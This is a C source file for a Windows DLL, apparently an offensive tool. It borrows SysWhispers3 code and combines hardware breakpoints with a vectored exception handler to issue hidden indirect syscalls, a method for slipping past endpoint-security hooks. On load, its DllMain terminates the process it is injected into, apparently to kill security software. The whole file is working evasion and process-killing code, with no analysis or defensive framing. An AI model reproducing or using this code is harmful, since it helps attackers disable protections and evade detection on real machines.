#include <windows.h>
#include <stdio.h>
#include "syscalls.h"
#include "nt.h"

DWORD_PTR GetSystemTimeAddr = 0;
DWORD_PTR NtQuerySystemTimeAddr = 0;
DWORD_PTR DebugBreakpointAddr = 0;
DWORD_PTR o_para1 = 0;
DWORD_PTR o_para2 = 0;
DWORD_PTR o_para3 = 0;
DWORD_PTR o_para4 = 0;
DWORD_PTR o_para5 = 0;
DWORD_PTR o_para6 = 0;
DWORD_PTR o_para7 = 0;
DWORD_PTR o_para8 = 0;
DWORD_PTR o_para9 = 0;
DWORD_PTR o_para10 = 0;
DWORD_PTR o_para11 = 0;
DWORD_PTR o_para12 = 0;
DWORD_PTR o_para13 = 0;
DWORD_PTR o_para14 = 0;
DWORD_PTR o_para15 = 0;
DWORD_PTR o_para16 = 0;
DWORD_PTR o_para17 = 0;
DWORD_PTR o_para_num = 0;
DWORD o_funchash = 0;
PVOID handler = NULL;
NTSTATUS status = 0;

SW3_SYSCALL_LIST SW3_SyscallList;

DWORD SW3_HashSyscall(PCSTR FunctionName)
{
    DWORD i = 0;
    DWORD Hash = SW3_SEED;

    while (FunctionName[i])
    {
        WORD PartialName = *(WORD*)((ULONG_PTR)FunctionName + i++);
        Hash ^= PartialName + SW3_ROR8(Hash);
    }

    return Hash;
}

PVOID SC_Address(PVOID NtApiAddress)
{
    DWORD searchLimit = 512;
    PVOID SyscallAddress;
    BYTE syscall_code[] = { 0x0f, 0x05, 0xc3 };
    ULONG distance_to_syscall = 0x12;
    // we don't really care if there is a 'jmp' between
    // NtApiAddress and the 'syscall; ret' instructions
    SyscallAddress = SW3_RVA2VA(PVOID, NtApiAddress, distance_to_syscall);
    if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
    {
        // we can use the original code for this system call :)
#if defined(DEBUG)
        printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
#endif
        return SyscallAddress;
    }
    // the 'syscall; ret' intructions have not been found,
    // we will try to use one near it, similarly to HalosGate
    for (ULONG32 num_jumps = 1; num_jumps < searchLimit; num_jumps++)
    {
        // let's try with an Nt* API below our syscall
        SyscallAddress = SW3_RVA2VA(
            PVOID,
            NtApiAddress,
            distance_to_syscall + num_jumps * 0x20);
        if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
        {
#if defined(DEBUG)
            printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
#endif
            return SyscallAddress;
        }
        // let's try with an Nt* API above our syscall
        SyscallAddress = SW3_RVA2VA(
            PVOID,
            NtApiAddress,
            distance_to_syscall - num_jumps * 0x20);
        if (!memcmp((PVOID)syscall_code, SyscallAddress, sizeof(syscall_code)))
        {
#if defined(DEBUG)
            printf("Found Syscall Opcodes at address 0x%p\n", SyscallAddress);
#endif
            return SyscallAddress;
        }
    }
    return NULL;
}

BOOL SW3_PopulateSyscallList()
{
    if (SW3_SyscallList.Count) return TRUE;
    PSW3_PEB Peb = (PSW3_PEB)__readgsqword(0x60);
    PSW3_PEB_LDR_DATA Ldr = Peb->Ldr;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
    PVOID DllBase = NULL;
    // Get the DllBase address of NTDLL.dll. NTDLL is not guaranteed to be the second
    // in the list, so it's safer to loop through the full list and find it.
    PSW3_LDR_DATA_TABLE_ENTRY LdrEntry;
    for (LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (PSW3_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
    {
        DllBase = LdrEntry->DllBase;
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
        PIMAGE_NT_HEADERS NtHeaders = SW3_RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
        PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
        DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (VirtualAddress == 0) continue;
        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)SW3_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);
        // If this is NTDLL.dll, exit loop.
        PCHAR DllName = SW3_RVA2VA(PCHAR, DllBase, ExportDirectory->Name);
        if ((*(ULONG*)DllName | 0x20202020) != 0x6c64746e) continue;
        if ((*(ULONG*)(DllName + 4) | 0x20202020) == 0x6c642e6c) break;
    }
    if (!ExportDirectory) return FALSE;
    DWORD NumberOfNames = ExportDirectory->NumberOfNames;
    PDWORD Functions = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
    PDWORD Names = SW3_RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
    PWORD Ordinals = SW3_RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);
    // Populate SW3_SyscallList with unsorted Zw* entries.
    DWORD i = 0;
    PSW3_SYSCALL_ENTRY Entries = SW3_SyscallList.Entries;
    do
    {
        PCHAR FunctionName = SW3_RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);
        // Is this a system call?
        if (*(USHORT*)FunctionName == 0x775a)
        {
            Entries[i].Hash = SW3_HashSyscall(FunctionName);
            Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];
            Entries[i].SyscallAddress = SC_Address(SW3_RVA2VA(PVOID, DllBase, Entries[i].Address));
            i++;
            if (i == SW3_MAX_ENTRIES) break;
        }
    } while (--NumberOfNames);
    // Save total number of system calls found.
    SW3_SyscallList.Count = i;
    // Sort the list by address in ascending order.
    for (DWORD i = 0; i < SW3_SyscallList.Count - 1; i++)
    {
        for (DWORD j = 0; j < SW3_SyscallList.Count - i - 1; j++)
        {
            if (Entries[j].Address > Entries[j + 1].Address)
            {
                SW3_SYSCALL_ENTRY TempEntry;
                TempEntry.Hash = Entries[j].Hash;
                TempEntry.Address = Entries[j].Address;
                TempEntry.SyscallAddress = Entries[j].SyscallAddress;
                Entries[j].Hash = Entries[j + 1].Hash;
                Entries[j].Address = Entries[j + 1].Address;
                Entries[j].SyscallAddress = Entries[j + 1].SyscallAddress;
                Entries[j + 1].Hash = TempEntry.Hash;
                Entries[j + 1].Address = TempEntry.Address;
                Entries[j + 1].SyscallAddress = TempEntry.SyscallAddress;
            }
        }
    }
    return TRUE;
}

DWORD SW3_GetSyscallNumber(DWORD FunctionHash)
{
    // Ensure SW3_SyscallList is populated.
    if (!SW3_PopulateSyscallList()) return -1;

    for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
    {
        if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
        {
            return i;
        }
    }

    return -1;
}

EXTERN_C PVOID SW3_GetSyscallAddress(DWORD FunctionHash)
{
    // Ensure SW3_SyscallList is populated.
    if (!SW3_PopulateSyscallList()) return NULL;

    for (DWORD i = 0; i < SW3_SyscallList.Count; i++)
    {
        if (FunctionHash == SW3_SyscallList.Entries[i].Hash)
        {
            return SW3_SyscallList.Entries[i].SyscallAddress;
        }
    }

    return NULL;
}
/*========================================
以上代码属于GitHub项目 SysWhisper3 的部分引用
https://github.com/klezVirus/SysWhispers3
========================================*/


void GetBreakpointAddr() {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    FARPROC fpGetSystemTimeAddr = GetProcAddress(hKernel32, "GetSystemTime");
    GetSystemTimeAddr = (DWORD_PTR)fpGetSystemTimeAddr;
    NtQuerySystemTimeAddr = (DWORD_PTR)SW3_GetSyscallAddress(0x09A0F97AF);
}

LONG WINAPI ExceptionHandler(PEXCEPTION_POINTERS pExceptInfo) {
    CONTEXT ctx = *(pExceptInfo->ContextRecord);
    if (pExceptInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        DWORD_PTR rip = ctx.Rip;
        if (rip == (DWORD_PTR)GetSystemTimeAddr) {
            pExceptInfo->ContextRecord->Rip = (DWORD_PTR)NtQuerySystemTimeAddr;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        else if (rip == (DWORD_PTR)NtQuerySystemTimeAddr) {
            pExceptInfo->ContextRecord->Rcx = (ULONG_PTR)o_para1; // 第1个参数
            pExceptInfo->ContextRecord->Rdx = (ULONG_PTR)o_para2; // 第2个参数
            pExceptInfo->ContextRecord->R8 = (ULONG_PTR)o_para3; // 第3个参数
            pExceptInfo->ContextRecord->R9 = (ULONG_PTR)o_para4; // 第4个参数
            pExceptInfo->ContextRecord->R10 = (ULONG_PTR)o_para1;
            if (o_para_num > 4) {
                int extra_para = o_para_num - 4;
                DWORD64* stack = (DWORD64*)(ctx.Rsp + 40);
                DWORD_PTR params[] = { o_para5, o_para6, o_para7, o_para8, o_para9, o_para10,
                          o_para11, o_para12, o_para13, o_para14, o_para15, o_para16, o_para17 };
                for (int i = 0; i < extra_para; ++i) {
                    stack[i] = (DWORD64)(params[i]);
                }
            }
            DWORD syscall_number = SW3_GetSyscallNumber(o_funchash);
            pExceptInfo->ContextRecord->Rax = syscall_number;
            DWORD_PTR syscall_addr = (DWORD_PTR)SW3_GetSyscallAddress(o_funchash);
            pExceptInfo->ContextRecord->Rip = syscall_addr;
            pExceptInfo->ContextRecord->R11 = syscall_addr;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
        else {
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

void SetBreakPoint() {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();
    GetThreadContext(hThread, &ctx);
        ctx.Dr0 = GetSystemTimeAddr;
        ctx.Dr1 = NtQuerySystemTimeAddr;
        // ctx.Dr2 = DebugBreakpointAddr;
        ctx.Dr7 = 0x0000000f; //启用 Dr0 Dr1
        // ctx.Dr7 = 0x00000015; 调试用
        SetThreadContext(hThread, &ctx);
}

void StarFlyCoreStart() {
    GetBreakpointAddr();
    SetBreakPoint();
    handler = AddVectoredExceptionHandler(1, ExceptionHandler);
}

void KillInjectedProcess() {
    DWORD pid = GetCurrentProcessId();
    HANDLE hProcess;
    CLIENT_ID clientId;
    clientId.UniqueProcess = (HANDLE)pid;
    clientId.UniqueThread = NULL;
    OBJECT_ATTRIBUTES objectAttributes;
    InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);
    status = SFNtOpenProcess(&hProcess, PROCESS_TERMINATE, &objectAttributes, &clientId);
    status = SFNtTerminateProcess(hProcess, 0);
    SFNtClose(hProcess);
    return;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            StarFlyCoreStart();
            KillInjectedProcess();
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

NTSTATUS SFNtTerminateProcess(HANDLE ProcessHandle, NTSTATUS ExitStatus) {
    o_para1 = (ULONG_PTR)ProcessHandle;
    o_para2 = (ULONG_PTR)ExitStatus;
    o_para3 = 0;
    o_para4 = 0;
    o_para5 = 0;
    o_para6 = 0;
    o_para7 = 0;
    o_para8 = 0;
    o_para9 = 0;
    o_para10 = 0;
    o_para11 = 0;
    o_para12 = 0;
    o_para13 = 0;
    o_para14 = 0;
    o_para15 = 0;
    o_para16 = 0;
    o_para17 = 0;
    o_para_num = 2;
    o_funchash = 0x049933678;
    GetSystemTime(1);
    return 0;
}

NTSTATUS SFNtClose(HANDLE Handle) {
    o_para1 = (ULONG_PTR)Handle;
    o_para2 = 0;
    o_para3 = 0;
    o_para4 = 0;
    o_para5 = 0;
    o_para6 = 0;
    o_para7 = 0;
    o_para8 = 0;
    o_para9 = 0;
    o_para10 = 0;
    o_para11 = 0;
    o_para12 = 0;
    o_para13 = 0;
    o_para14 = 0;
    o_para15 = 0;
    o_para16 = 0;
    o_para17 = 0;
    o_para_num = 1;
    o_funchash = 0x034941D19;
    GetSystemTime(1);
    return 0;
}

NTSTATUS SFNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) {
    o_para1 = (ULONG_PTR)ProcessHandle;
    o_para2 = (ULONG_PTR)DesiredAccess;
    o_para3 = (ULONG_PTR)ObjectAttributes;
    o_para4 = (ULONG_PTR)ClientId;
    o_para5 = 0;
    o_para6 = 0;
    o_para7 = 0;
    o_para8 = 0;
    o_para9 = 0;
    o_para10 = 0;
    o_para11 = 0;
    o_para12 = 0;
    o_para13 = 0;
    o_para14 = 0;
    o_para15 = 0;
    o_para16 = 0;
    o_para17 = 0;
    o_para_num = 4;
    o_funchash = 0x0FEA4D138;
    GetSystemTime(1);
    return 0;
}
